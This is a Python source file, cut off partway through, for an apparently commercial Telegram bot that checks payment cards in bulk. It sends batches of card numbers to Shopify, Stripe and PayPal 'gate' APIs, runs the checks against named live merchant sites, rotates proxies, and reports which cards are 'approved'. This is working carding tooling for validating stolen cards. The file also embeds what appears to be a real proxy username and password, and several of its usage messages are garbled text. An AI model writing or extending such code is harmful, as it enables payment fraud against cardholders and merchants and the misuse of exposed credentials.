import aiohttp
import asyncio
import time
import re
from telegram import Update
from telegram.ext import CommandHandler, ContextTypes
from config import API_TIMEOUT, get_bin_info, kb_result

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 SHARED CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
MAX_CARDS = 50
SEMAPHORE_LIMIT = 5

def get_styled_plan(raw_plan: str) -> str:
    plan_upper = raw_plan.upper()
    if plan_upper == "CORE": return "✨ Cᴏʀᴇ ✨"
    elif plan_upper == "ELITE": return "⭐ Eʟɪᴛᴇ ⭐"
    elif plan_upper == "ROOT": return "👑 Rᴏᴏᴛ 👑"
    else: return "Tʀɪᴀʟ"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 SHOPIFY MASS CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SH_API = "https://autosh.up.railway.app/shopii"
SH_GATE_NAME = "SHOPIFY MASS | 1$"
SH_API_TIMEOUT = 120

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 STRIPE MASS CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CHK_API_URL = "https://stripe-auth-test-production.up.railway.app/st0"
CHK_SITE = "fashionspicex.com"
CHK_TIMEOUT = 180

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 PAYPAL MASS CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PP_NEW_API = "https://paypal0-1.onrender.com/pp1/cc={card}"
PP_GATE_NAME = "PAYPAL MASS | 0.10 ᴜꜱᴅ"
PP_TIMEOUT = API_TIMEOUT

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 PASTE YOUR PROXIES HERE (Used for Shopify only)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PROXIES = [
    "http://purevpn0s12153504:1LTpwxbCJbEdXo@px041202.pointtoserver.com:10780",
    "http://user:pass@ip:port",
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 PASTE YOUR SITES HERE (Used for Shopify only)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SITES = [
    "https://powerbuild.store",
    "https://examplestore.com",
    "https://anotherstore.myshopify.com",
]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SHARED UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def parse_cards(text: str) -> list:
    cards = []
    parts = text.replace("|", "\n").replace(";", "\n").split("\n")
    for p in parts:
        c = p.strip()
        if c and len(c) >= 13:
            cards.append(c)
    return cards


async def _download_file_cards(bot, file_id: str) -> str | None:
    """Download a text file from Telegram and return its content as string."""
    try:
        file = await bot.get_file(file_id)
        return file.decode("utf-8", errors="ignore")
    except Exception:
        return None


async def extract_cards_from_update(update: Update, bot) -> list | None:
    """
    Extract cards from multiple input methods:
    1. Reply to a text message containing cards
    2. Reply to a file document containing cards (.txt)
    3. Send a file directly as document (with /msh as caption)
    4. Direct text after command: /msh cc|mm|yy|cvv
    
    Returns None if no valid cards found.
    """
    msg = update.message

    # ── Method 1: Reply to message (text or file) ──
    if msg.reply_to_message:
        replied = msg.reply_to_message

        # Reply to text message
        if replied.text and replied.text.strip():
            return parse_cards(replied.text)

        # Reply to file document
        if replied.document and replied.document.file_id:
            text = await _download_file_cards(bot, replied.document.file_id)
            if text:
                return parse_cards(text)

    # ── Method 2: Direct file sent (user sent file, /msh is caption) ──
    if msg.document and msg.document.file_id:
        text = await _download_file_cards(bot, msg.document.file_id)
        if text:
            return parse_cards(text)

    # ── Method 3: Direct text after command ──
    if msg.text and msg.text.strip():
        # Remove command from text
        text = msg.text
        # If it's a command, extract args
        if text.startswith('/'):
            parts = text.split(maxsplit=1)
            if len(parts) > 1:
                return parse_cards(parts[1])
        else:
            return parse_cards(text)

    return None


class ProxyRotator:
    def __init__(self, proxies: list):
        self.proxies = proxies
        self._index = 0

    def next(self) -> str | None:
        if not self.proxies: return None
        proxy = self.proxies[self._index % len(self.proxies)]
        self._index += 1
        return proxy

    def count(self) -> int:
        return len(self.proxies)


async def deduct_credits(context: ContextTypes.DEFAULT_TYPE, user_id: int, amount: int) -> bool:
    """Returns True if success, False if not enough credits."""
    ud = context.bot_data.get("user_data", {}).get(str(user_id), {})
    is_premium = ud.get("plan", "TRIAL").upper() != "TRIAL" and ud.get("expires", 0) > time.time()
    if is_premium:
        return True
    available = ud.get("credits", 0)
    if available < amount:
        return False
    ud["credits"] = available - amount
    return True


def get_user_plan_ui(context: ContextTypes.DEFAULT_TYPE, user_id: int) -> str:
    ud = context.bot_data.get("user_data", {}).get(str(user_id), {})
    raw_plan = ud.get("plan", "TRIAL").upper()
    if raw_plan != "TRIAL" and ud.get("expires", 0) <= time.time():
        raw_plan = "TRIAL"
    return get_styled_plan(raw_plan)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 SHOPIFY MASS WORKERS & COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def check_single_shopify_card(session: aiohttp.ClientSession, card: str, site: str, proxy: str | None, semaphore: asyncio.Semaphore) -> dict:
    async with semaphore:
        params = {"cc": card, "site": site}
        if proxy: params["proxy"] = proxy
        try:
            async with session.get(SH_API, params=params) as resp:
                try: 
                    data = await resp.json(content_type=None)
                except Exception: 
                    data = {"Response": await resp.text(), "Status": "false", "Gateway": "N/A", "Price": "N/A", "CC": card}
                if not isinstance(data, dict): 
                    data = {"Response": str(data), "Status": "false", "Gateway": "N/A", "Price": "N/A", "CC": card}
                return {
                    "card": card, 
                    "gateway": data.get("Gateway", "N/A"), 
                    "price": data.get("Price", "N/A"), 
                    "response": str(data.get("Response", "ERROR")), 
                    "status": str(data.get("Status", "false")).lower(), 
                    "cc_used": data.get("CC", card), 
                    "error": None
                }
        except asyncio.TimeoutError: 
            return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false"}
        except Exception as e: 
            return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false"}

async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.bot_data.get("msh_on", True):
        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
        return

    # ── Extract cards from text, reply, or file ──
    cards = await extract_cards_from_update(update, context.bot)
    if not cards:
        await update.message.reply_text(
            "⚠️ Uꜱᴀɢᴇ: Rᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱ ᴡᴇɴᴅ ᴡɪᴴʟᴇ ᴡᴏʟ ᴡᴏʟꜰ, ᴏʀ ʀᴇᴘʟʏ ᴀ ꜰꜱᴇ ᴀ ꜰᴇɪᴄᴇ ᴡɪꜱꜱ\n\n"
            "• Sᴇɴᴅ ᴛɪʟᴇ ᴀꜱ ꜱᴇ ᴀꜱᴇ ᴀꜱᴇ ᴡɪꜱꜱ\n"
            "• Rᴇᴘʟʏ ᴛᴏ ᴛᴏꜱ ᴛᴏꜱ ᴡᴏʟꜰ, ᴛᴏᴛᴏꜱ /msh ᴀꜱ ᴀꜱ ꜱ ᴛᴏᴡᴏꜰ\n"
            "• Oʀ ᴜᴇᴄᴇᴇ ᴄᴀʀᴅꜱ ᴡᴏʟꜰ ᴡᴇᴏᴅ ᴛᴏꜱ\n\n"
            "Fᴏʀᴍᴀᴛ: <code>/msh cc|mm|yy|cvv</code>",
            parse_mode="HTML",
        )
        return

    if len(cards) > MAX_CARDS:
        await update.message.reply_text(f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴏ ᴘʀ ʀᴜɴ. Yᴏᴜꜱ ꜱᴇ ꜱᴇɴᴛ: {len(cards)}", parse_mode="HTML")
        return

    if not await deduct_credits(context, update.effective_user.id, len(cards)):
        user_data = context.bot_data.get("user_data", {}).get(str(update.effective_user.id), {})
        await update.message.reply_text(
            f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱꜱ, ʜᴀᴠᴇ {user_data.get('credits', 0)}.", 
            parse_mode="HTML"
        )
        return

    rotator = ProxyRotator(PROXIES)
    sites = SITES if SITES else ["https://powerbuild.store"]
    proxy_info = f"Pʀᴏxɪᴇꜱꜱ ➺ {rotator.count()}" + (" (Nᴏɴᴇ)" if not PROXIES else "")
    msg = await update.message.reply_text(
        f"🦇 {SH_GATE_NAME}\n━━━━━━━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n{proxy_info}\n🌐 Sɪᴛᴇꜱꜱ ➺ {len(sites)}\n━━━━━━━━━━━━━━━━━━━━\n⏳ Pʀᴏᴄᴇꜱꜱꜱ...", 
        parse_mode="HTML"
    )

    bin_task = get_bin_info(cards[0][:6])
    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
    start_time = time.time()

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=SH_API_TIMEOUT), 
        connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)
    ) as session:
        tasks = [
            check_single_shopify_card(session, c, sites[i % len(sites)], rotator.next(), semaphore) 
            for i, c in enumerate(cards)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    try: 
        bin_data = await bin_task if asyncio.iscoroutine(bin_task) else bin_task
    except Exception: 
        bin_data = {"error": True}

    parsed = [r if not isinstance(r, Exception) else {"card": "???", "error": str(r)[:60], "response": "ERROR", "status": "false"} for r in results]
    approved_list = [r for r in parsed if not r.get("error") and (r["status"] == "true" or "approved" in r["response"].lower())]
    error_list = [r for r in parsed if r.get("error")]

    u = update.effective_user.username or update.effective_user.first_name or "User"
    bin_txt = "N/A"
    if bin_data and not bin_data.get("error"):
        s = str(bin_data.get("scheme", "N/A")).upper()
        t = str(bin_data.get("type", "N/A")).upper()
        b = bin_data.get("bank", "N/A")
        country = str(bin_data.get("country", "N/A")).upper()
        flag = bin_data.get("country_emoji", "")
        bin_txt = f"{s} - {t} - {b}"

    lines = [
        f"🦇 {SH_GATE_NAME} ➛ Cᴏᴍᴘᴘʟᴇᴛᴇᴅ", "━━━━━━━━━━━━━━━━━━━━",
        f"📊 Tᴏᴛᴛᴀʟ ➺ {len(parsed)}", f"✅ Aᴘᴘʀᴏᴠᴏᴠᴇᴅ ➺ {len(approved_list)}",
        f"❌ Dᴇᴄʟɪɴᴇᴅᴅ ➺ {len(parsed) - len(approved_list) - len(error_list)}",
        f"⚠️ Eʀʀᴏʀꜱꜱꜱ ➺ {len(error_list)}",
        f"⏱️ Tɪᴍᴇ ➺ {time.time() - start_time:.2f}s", "━━━━━━━━━━━━━━━━━━",
    ]

    approved_lines = []
    if approved_list:
        approved_lines.append(f"\n✅ Aᴘᴘᴘʀᴏᴠᴇᴅ ({len(approved_list)})")
        approved_lines.append("━━━━━━━━━━━━━━━━━━━━")
        for i, r in enumerate(approved_list, 1):
            masked = r["card"][:6] + "xxxx" + r["card"][-4:] if len(r["card"]) > 10 else r["card"]
            approved_lines.append(f"  {i}. <code>{masked}</code>\n     Gᴀᴛᴇᴡᴀʏ ➺ {r['gateway']}\n     Pʀɪᴄᴄᴇ ➺ ${r['price']}\n     Rᴇꜱꜱᴘ ➺ {r['response'][:50]}")

    footer_lines = [f"\n━━━━━━━━━━━━━━━━", f"🏦 Bɪɴ ➺ {bin_txt}", "━━━━━━━━━━━━━━━━", f"🦇 Uꜱᴇʀ ➺ {u}"]
    full_text = "\n".join(lines + approved_lines + footer_lines)

    if len(full_text) <= 4000:
        try: 
            await msg.edit_text(full_text, parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True)
        except Exception: 
            await msg.edit_text(full_text[:4000], parse_mode="HTML", reply_markup=kb_result())
    else:
        try: 
            await msg.edit_text(
                "\n".join(lines) + "\n\n📜 Fᴜʟʟ ʀᴇꜱꜱᴛ sᴇɴᴛ ʙᴇʟᴏᴡ ⬇️" + "\n".join(footer_lines), 
                parse_mode="HTML", 
                reply_markup=kb_result(), 
                disable_web_page_preview=True
            )
        except Exception: 
            pass
        for i in range(0, len(approved_list), 15):
            chunk = approved_list[i:i+15]
            chunk_lines = [f"✅ Aᴘᴘʀᴏᴠᴇᴅ ({i+1}-{min(i+15, len(approved_list))}/{len(approved_list)})"]
            chunk_lines.append("━━━━━━━━━━━━━━━━━━")
            for j, r in enumerate(chunk, i+1):
                masked = r["card"][:6] + "xxxx" + r["card"][-4:] if len(r["card"]) > 10 else r["card"]
                chunk_lines.append(f"  {j}. <code>{masked}</code>\n     Gᴀᴛᴇᴡᴀʏ ➺ {r['gateway']}\n     Pʀɪᴄᴄᴇ ➺ ${r['price']}\n     Rᴇꜱᴘ ➺ {r['response'][:50]}")
            try: 
                await context.bot.send_message(
                    chat_id=update.effective_chat.id, 
                    text="\n".join(chunk_lines)[:4000], 
                    parse_mode="HTML"
                )
            except Exception: 
                pass
            await asyncio.sleep(0.3)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 STRIPE MASS WORKERS & COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def check_single_stripe_card(session: aiohttp.ClientSession, card: str, semaphore: asyncio.Semaphore) -> dict:
    async with semaphore:
        api_url = f"{CHK_API_URL}?cc={card}&site={CHK_SITE}"
        try:
            async with session.get(api_url) as resp:
                try: 
                    data = await resp.json(content_type=None)
                except Exception: 
                    data = {"response": await resp.text()}
                if not isinstance(data, dict): 
                    data = {"response": str(data)}
                raw_response = str(data.get("response", "NO RESPONSE"))
                raw_response = re.sub(r'https?://\S+', '', raw_response).strip()
                if not raw_response: 
                    raw_response = "NO RESPONSE"
                return {
                    "card": card, 
                    "cc_used": card, 
                    "response": raw_response, 
                    "status": "true" if "approved" in raw_response.lower() else "false", 
                    "error": None
                }
        except asyncio.TimeoutError: 
            return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false"}
        except Exception as e: 
            return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false"}

async def cmd_mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.bot_data.get("mchk_on", True):
        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
        return

    # ── Extract cards from text, reply, or file ──
    cards = await extract_cards_from_update(update, context.bot)
    if not cards:
        await update.message.reply_text(
            "⚠️ Uꜱᴀɢᴇ: Rᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱ ᴡᴇꜱꜱ ᴡᴏꜱꜱ, ᴏʀ ʀᴇᴘʟʏ ᴀ ꜰᴇɪᴄᴇ ᴀ ꜱᴇꜱᴢ with cards\n\n"
            "• Sᴇɴᴅ ᴛɪʟᴇ ᴀ ꜱᴇ ᴀ ꜱᴇ ᴀꜱᴇ as document\n"
            "• Rᴇᴘʟʏ ᴛᴏᴛᴏꜱ with /msh as caption\n\n"
            "• Oꜱ ᴇᴄᴇᴛ ᴄᴀʀᴅꜱ ᴡᴏꜱ ꜱ\n\n"
            "Fᴏʀᴍᴀᴍ: <code>/mchk cc|mm|yy|cvv</code>",
            parse_mode="HTML",
        )
        return

    if len(cards) > MAX_CARDS:
        await update.message.reply_text(
            f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴏ ᴘʀʀᴜɴ. Yᴏᴜᴜ ꜱᴇ ꜱᴇ: {len(cards)}", 
            parse_mode="HTML"
        )
        return

    if not await deduct_credits(context, update.effective_user.id, len(cards)):
        user_data = context.bot_data.get("user_data", {}).get(str(update.effective_user.id), {})
        await update.message.reply_text(
            f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱꜱ, ʜᴀᴠᴇ {user_data.get('credits', 0)}.", 
            parse_mode="HTML"
        )
        return

    msg = await update.message.reply_text(
        f"🦇 STRIPE MASS 0$ 💳 🟢\n━━━━━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n━━━━━━━━━━━━━━━━━━\n⏳ Pʀᴏᴄᴇꜱꜱꜱ...", 
        parse_mode="HTML"
    )

    bin_task = get_bin_info(cards[0][:6])
    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
    start_time = time.time()

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=CHK_TIMEOUT), 
        connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)
    ) as session:
        tasks = [check_single_stripe_card(session, c, semaphore) for c in cards]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    try: 
        bin_data = await bin_task if asyncio.iscoroutine(bin_task) else bin_task
    except Exception: 
        bin_data = {"error": True}

    parsed = [r if not isinstance(r, Exception) else {"card": "???", "error": str(r)[:60], "response": "ERROR", "status": "false"} for r in results]
    approved_list = [r for r in parsed if not r.get("error") and (r["status"] == "true" or "approved" in r["response"].lower())]
    error_list = [r for r in parsed if r.get("error")]

    username = update.effective_user.first_name or "User"
    plan_ui = get_user_plan_ui(context, update.effective_user.id)
    bin_txt = "N/A"
    if bin_data and not bin_data.get("error"):
        s = str(bin_data.get("scheme", "N/A")).upper()
        b = bin_data.get("bank", "N/A")
        country = str(bin_data.get("country", "N/A")).upper()
        flag = bin_data.get("country_emoji", "")
        bin_txt = f"{s} - {b} - {flag} {country}"

    lines = [
        "🦇 STRIPE MASS 0$ 💳 🟢 ➛ Cᴏᴍᴘᴘᴛᴇᴅ",
        "━━━━━━━━━━━━━━━━━━━━", f"📊 Tᴏᴛᴀʟ ➺ {len(parsed)}",
        f"✅ Aᴘᴘʀᴏᴠᴇᴅ ➺ {len(approved_list)}",
        f"❌ Dᴇᴄʟɪɴᴇᴅ ➺ {len(parsed) - len(approved_list) - len(error_list)}",
        f"⚠️ Eʀʀᴏʀꜱꜱꜱ ➺ {len(error_list)}",
        f"⏱️ Tɪᴍᴇ ➺ {time.time() - start_time:.2f}s",
        "━━━━━━━━━━━━━━━━━━",
    ]

    approved_lines = []
    if approved_list:
        approved_lines.append(f"\n✅ Aᴘᴘʀᴏᴠᴇᴅ ({len(approved_list)})")
        approved_lines.append("━━━━━━━━━━━━━━━━━━━━")
        for i, r in enumerate(approved_list, 1):
            masked = r["card"][:6] + "xxxx" + r["card"][-4:] if len(r["card"]) > 10 else r["card"]
            approved_lines.append(f"  {i}. <code>{masked}</code>\n     Rᴀᴡ ➺ {r['response'][:60]}")

    footer_lines = [
        "\n━━━━━━━━━━━━━━━━━━", f"🏦 Iɴꜰᴏ ➺ {bin_txt}",
        "━━━━━━━━━━━━━━━━━━", f"Uꜱᴇʀ ➺ {username} 👑 ({plan_ui})",
        "Pʀᴏ ➺ Batman⚡",
    ]
    full_text = "\n".join(lines + approved_lines + footer_lines)

    if len(full_text) <= 4000:
        try: 
            await msg.edit_text(full_text, parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True)
        except Exception: 
            await msg.edit_text(full_text[:4000], parse_mode="HTML", reply_markup=kb_result())
    else:
        try: 
            await msg.edit_text(
                "\n".join(lines) + "\n\n📜 Fᴜʟʟ ʀᴇꜱꜱᴛ sᴇɴᴛ ʙᴇʟᴏᴡ ⬇️" + "\n".join(footer_lines), 
                parse_mode="HTML", 
                reply_markup=kb_result(), 
                disable_web_page_preview=True
            )
        except Exception: 
            pass
        for i in range(0, len(approved_list), 15):
            chunk = approved_list[i:i+15]
            chunk_lines = [
                f"✅ Aᴘᴘʀᴏᴠᴇᴅ ({i+1}-{min(i+15, len(approved_list))}/{len(approved_list)})", 
                "━━━━━━━━━━━━━━━━━━"
            ]
            for j, r in enumerate(chunk, i+1):
                masked = r["card"][:6] + "xxxx" + r["card"][-4:] if len(r["card"]) > 10 else r["card"]
                chunk_lines.append(f"  {j}. <code>{masked}</code>\n     Rᴛᴡ ➺ {r['response'][:60]}")
            try: 
                await context.bot.send_message(
                    chat_id=update.effective_chat.id, 
                    text="\n".join(chunk_lines)[:4000], 
                    parse_mode="HTML"
                )
            except Exception: 
                pass
            await asyncio.sleep(0.3)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 PAYPAL MASS WORKERS & COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def check_single_pp_card(session: aiohttp.ClientSession, card: str, semaphore: asyncio.Semaphore) -> dict:
    async with semaphore:
        api_url = PP_NEW_API.format(card=card)
        try:
            async with session.get(api_url) as resp:
                try: 
                    data = await resp.json(content_type=None)
                except Exception: 
                    data = {"status": "declined", "message": await resp.text()}
                if not isinstance(data, dict): 
                    data = {"status": "declined", "message": str(data)}
                status = str(data.get("status", "declined")).lower()
                code = str(data.get("code", ""))
                message = str(data.get("message", "NO RESPONSE"))
                raw = message or code or "NO RESPONSE"
                raw = re.sub(r'https?://\S+', '', raw).strip()
                if not raw: 
                    raw = "NO RESPONSE"
                return {
                    "card": card, 
                    "cc_used": card, 
                    "response": raw,
                    "status": "true" if status == "approved" else "false", 
                    "error": None,
                }
        except asyncio.TimeoutError:
            return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false"}
        except Exception as e:
            return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false"}

async def cmd_mpp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.bot_data.get("mpp_on", True):
        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
        return

    # ── Extract cards from text, reply, or file ──
    cards = await extract_cards_from_update(update, context.bot)
    if not cards:
        await update.message.reply_text(
            "⚠️ Uꜱᴀɢᴇ: Rᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱ ᴡᴇꜱꜱ ᴡᴏᴡꜱꜱ, ᴏʀ ʀᴇᴘʟʏ ᴀ ꜰᴇɪᴄᴇ ᴀ ꜰᴇᴢ with cards\n\n"
            "• Sᴇɴᴅ ᴛɪʟᴇ ᴀ ꜱᴇ ᴀ ꜱᴇ ᴀꜱᴢ as document\n"
            "• Rᴇᴘʟʏ ᴛᴏᴛᴏꜱ with /mpp as caption\n"
            "• Oꜱᴇᴄᴇᴛ ᴄᴀʀᴅꜱ ᴡᴏᴜꜱ ꜱ\n\n"
            "Fᴏʀᴍᴀᴍ: <code>/mpp email|pass</code>",
            parse_mode="HTML",
        )
        return

    if len(cards) > MAX_CARDS:
        await update.message.reply_text(
            f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴏ ᴘʀʀᴜɴ. Yᴏᴜᴜᴇ ꜱᴇ: {len(cards)}", 
            parse_mode="HTML"
        )
        return

    if not await deduct_credits(context, update.effective_user.id, len(cards)):
        user_data = context.bot_data.get("user_data", {}).get(str(update.effective_user.id), {})
        await update.message.reply_text(
            f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱꜱ, ʜᴀᴠᴇ {user_data.get('credits', 0)}.", 
            parse_mode="HTML"
        )
        return

    msg = await update.message.reply_text(
        f"🦇 {PP_GATE_NAME} 🛒 🟢\n━━━━━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n━━━━━━━━━━━━━━━━━━\n⏳ Pʀᴏᴄᴇꜱꜱꜱꜱ...", 
        parse_mode="HTML"
    )

    bin_task = get_bin_info(cards[0][:6])
    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
    start_time = time.time()

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=PP_TIMEOUT), 
        connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)
    ) as session:
        tasks = [check_single_pp_card(session, c, semaphore) for c
